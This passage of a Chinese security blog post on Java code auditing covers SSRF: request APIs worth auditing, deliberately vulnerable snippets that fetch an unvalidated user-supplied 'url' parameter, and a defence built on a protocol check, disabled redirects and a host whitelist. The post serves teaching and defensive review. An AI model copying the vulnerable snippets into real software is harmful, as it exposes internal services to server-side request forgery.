+<h4 id="0x02-SSRF审计函数"><a href="#0x02-SSRF审计函数" class="headerlink" title="0x02 SSRF审计函数"></a>0x02 SSRF审计函数</h4><p>SSRF漏洞一般位于远程图片加载与下载、图片或文章收藏功能、URL分享、通过URL在线翻译、转码等功能点处。<br>代码审计时需要关注的发起HTTP请求的类及函数，部分如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HttpURLConnection. getInputStream</span><br><span class="line">URLConnection. getInputStream</span><br><span class="line">Request.Get. execute</span><br><span class="line">Request.Post. execute</span><br><span class="line">URL.openStream</span><br><span class="line">ImageIO.read</span><br><span class="line">OkHttpClient.newCall.execute</span><br><span class="line">HttpClients. execute</span><br><span class="line">HttpClient.execute</span><br><span class="line">……</span><br></pre></td></tr></table></figure></p>
+<h4 id="0x03-SSRF漏洞代码示例"><a href="#0x03-SSRF漏洞代码示例" class="headerlink" title="0x03 SSRF漏洞代码示例"></a>0x03 SSRF漏洞代码示例</h4><h5 id="1-HttpURLConnection"><a href="#1-HttpURLConnection" class="headerlink" title="1) HttpURLConnection"></a>1) HttpURLConnection</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> //HttpURLConnection ssrf vul</span><br><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">URL u = new URL(url);</span><br><span class="line"> URLConnection urlConnection = u.openConnection();  </span><br><span class="line">HttpURLConnection httpUrl = (HttpURLConnection)urlConnection;   </span><br><span class="line">BufferedReader in = new BufferedReader(new InputStreamReader(httpUrl.getInputStream())); //发起请求,触发漏洞</span><br><span class="line">String inputLine;</span><br><span class="line"> StringBuffer html = new StringBuffer(); </span><br><span class="line"></span><br><span class="line"> while ((inputLine = in.readLine()) != null) &#123;</span><br><span class="line">         html.append(inputLine);</span><br><span class="line">        &#125;        </span><br><span class="line"> System.out.println(&quot;html:&quot; + html.toString());</span><br><span class="line"> in.close();</span><br></pre></td></tr></table></figure>
+<h5 id="2-urlConnection"><a href="#2-urlConnection" class="headerlink" title="2) urlConnection"></a>2) urlConnection</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//urlConnection ssrf vul</span><br><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">URL u = new URL(url);</span><br><span class="line">URLConnection urlConnection = u.openConnection();</span><br><span class="line">BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); //发起请求,触发漏洞</span><br><span class="line">String inputLine;</span><br><span class="line">StringBuffer html = new StringBuffer();</span><br><span class="line">while ((inputLine = in.readLine()) != null) &#123;</span><br><span class="line">     html.append(inputLine);</span><br><span class="line">&#125;        </span><br><span class="line">System.out.println(&quot;html:&quot; + html.toString());</span><br><span class="line">in.close();</span><br></pre></td></tr></table></figure>
+<h5 id="3-ImageIO"><a href="#3-ImageIO" class="headerlink" title="3) ImageIO"></a>3) ImageIO</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// ImageIO ssrf vul</span><br><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">URL u = new URL(url);</span><br><span class="line">BufferedImage img = ImageIO.read(u); // 发起请求,触发漏洞</span><br></pre></td></tr></table></figure>
+<h5 id="4-其他"><a href="#4-其他" class="headerlink" title="4) 其他"></a>4) 其他</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// Request漏洞示例</span><br><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">return Request.Get(url).execute().returnContent().toString();//发起请求</span><br><span class="line"></span><br><span class="line">// openStream漏洞示例</span><br><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">URL u = new URL(url);</span><br><span class="line">inputStream = u.openStream();  //发起请求</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// OkHttpClient漏洞示例</span><br><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">OkHttpClient client = new OkHttpClient();</span><br><span class="line">com.squareup.okhttp.Request ok_http = new com.squareup.okhttp.Request.Builder().url(url).build();</span><br><span class="line">client.newCall(ok_http).execute();  //发起请求</span><br><span class="line"></span><br><span class="line">// HttpClients漏洞示例</span><br><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">CloseableHttpClient client = HttpClients.createDefault();</span><br><span class="line">HttpGet httpGet = new HttpGet(url);</span><br><span class="line">HttpResponse httpResponse = client.execute(httpGet); //发起请求</span><br></pre></td></tr></table></figure>
+<h4 id="0x04-SSRF漏洞防御"><a href="#0x04-SSRF漏洞防御" class="headerlink" title="0x04 SSRF漏洞防御"></a>0x04 SSRF漏洞防御</h4><p>1）限制协议为HTTP、HTTPS协议。<br>2）禁止30x跳转。<br>3）设置URL白名单或者限制内网IP。<br>4）限制请求的端口为http常用的端口。</p>
+<p>以上例中HttpURLConnection为例，防御代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">if (!SSRFHostCheck(url)) &#123;</span><br><span class="line">        System.out.println(&quot;warning!!! illegal url:&quot; + url);</span><br><span class="line">         return;</span><br><span class="line">&#125;    </span><br><span class="line">URL u = new URL(url);</span><br><span class="line"> </span><br><span class="line">URLConnection urlConnection = u.openConnection();  </span><br><span class="line">HttpURLConnection httpUrl = (HttpURLConnection)urlConnection;   </span><br><span class="line">            </span><br><span class="line">httpUrl.setInstanceFollowRedirects(false); //禁止30x跳转</span><br><span class="line">            </span><br><span class="line">BufferedReader in = new BufferedReader(new InputStreamReader(httpUrl.getInputStream())); //send request</span><br><span class="line">……………………</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public static Boolean SSRFHostCheck(String url) &#123;</span><br><span class="line">	try &#123;</span><br><span class="line">	   URL u = new URL(url);</span><br><span class="line">	   // 限制为http和https协议</span><br><span class="line">           if (!u.getProtocol().startsWith(&quot;http&quot;) &amp;&amp; !u.getProtocol().startsWith(&quot;https&quot;)) &#123;</span><br><span class="line">           String uProtocol = u.getProtocol();</span><br><span class="line">           System.out.println(&quot;illegal Protocol:&quot; + uProtocol);</span><br><span class="line">           return  false;</span><br><span class="line">         &#125;</span><br><span class="line">           </span><br><span class="line">          // 获取域名或IP，并转为小写</span><br><span class="line">          String host = u.getHost().toLowerCase();</span><br><span class="line">          String hostwhitelist = &quot;192.168.199.209&quot;;     //白名单    </span><br><span class="line">          if (host.equals(hostwhitelist)) &#123;</span><br><span class="line">       	   System.out.println(&quot;ok_host:&quot; + host);</span><br><span class="line">       	   return true;</span><br><span class="line">           &#125; else &#123;</span><br><span class="line">           	System.out.println(&quot;illegal host:&quot; + host);</span><br><span class="line">           	return false;</span><br><span class="line">          &#125;</span><br><span class="line">	    &#125; catch (Exception e) &#123;</span><br><span class="line">	        return false;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>上述SSRF漏洞与防御完整示例代码 已上传Github  详见 <a href="https://github.com/pplsec/JavaVul/tree/master/MySSRF" target="_blank" rel="noopener">https://github.com/pplsec/JavaVul/tree/master/MySSRF</a></p>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://xz.aliyun.com/t/1633" target="_blank" rel="noopener">https://xz.aliyun.com/t/1633</a><br><a href="http://rickgray.me/2015/06/08/xml-entity-attack-review/" target="_blank" rel="noopener">http://rickgray.me/2015/06/08/xml-entity-attack-review/</a><br><a href="https://github.com/c0ny1/xxe-lab/blob/master/java_xxe/src/me/gv7/xxe/LoginServlet.java" target="_blank" rel="noopener">https://github.com/c0ny1/xxe-lab/blob/master/java_xxe/src/me/gv7/xxe/LoginServlet.java</a><br><a href="https://joychou.org/java/javassrf.html" target="_blank" rel="noopener">https://joychou.org/java/javassrf.html</a><br><a href="https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/SSRF.java" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/SSRF.java</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/08/【Struts2-命令-代码执行漏洞分析系列】S2-045/" rel="next" title="【Struts2-命令-代码执行漏洞分析系列】S2-045">
+                <i class="fa fa-chevron-left"></i> 【Struts2-命令-代码执行漏洞分析系列】S2-045
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/10/29/取证分析之发现Windows恶意程序执行痕迹/" rel="prev" title="取证分析之发现Windows恶意程序执行痕迹">
+                取证分析之发现Windows恶意程序执行痕迹 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/ppl.jpg" alt="pplsec">
+            
+              <p class="site-author-name" itemprop="name">pplsec</p>
+              <p class="site-description motion-element" itemprop="description">渗透测试 应急响应 代码审计</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一、XXE"><span class="nav-text">一、XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-XXE漏洞简介"><span class="nav-text">0x01 XXE漏洞简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-XXE相关基础概念"><span class="nav-text">0x02 XXE相关基础概念</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#XML-amp-DTD"><span class="nav-text">XML&amp;DTD</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#实体ENTITY"><span class="nav-text">实体ENTITY</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-字符实体"><span class="nav-text">1)字符实体</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-命名实体（内部实体）"><span class="nav-text">2)命名实体（内部实体）</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-外部参数实体"><span class="nav-text">4)外部参数实体</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-XXE审计函数"><span class="nav-text">0x03 XXE审计函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-常用测试POC"><span class="nav-text">0x04 常用测试POC</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#POC1-外部普通实体"><span class="nav-text">POC1-外部普通实体</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#POC2-外部参数实体"><span class="nav-text">POC2-外部参数实体</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0X05-XXE漏洞代码示例"><span class="nav-text">0X05 XXE漏洞代码示例</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-DOM-Read-XML"><span class="nav-text">1) DOM Read XML</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-DOM4J-Read-XML"><span class="nav-text">2) DOM4J Read XML</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-JDOM2-Read-XML"><span class="nav-text">3) JDOM2 Read XML</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-SAX-Read-XML"><span class="nav-text">4) SAX Read XML</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x06-XXE漏洞防御"><span class="nav-text">0x06 XXE漏洞防御</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、SSRF"><span class="nav-text">二、SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-SSRF漏洞简介"><span class="nav-text">0x01 SSRF漏洞简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-SSRF审计函数"><span class="nav-text">0x02 SSRF审计函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-SSRF漏洞代码示例"><span class="nav-text">0x03 SSRF漏洞代码示例</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-HttpURLConnection"><span class="nav-text">1) HttpURLConnection</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-urlConnection"><span class="nav-text">2) urlConnection</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-ImageIO"><span class="nav-text">3) ImageIO</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-其他"><span class="nav-text">4) 其他</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-SSRF漏洞防御"><span class="nav-text">0x04 SSRF漏洞防御</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考"><span class="nav-text">参考</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">pplsec</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
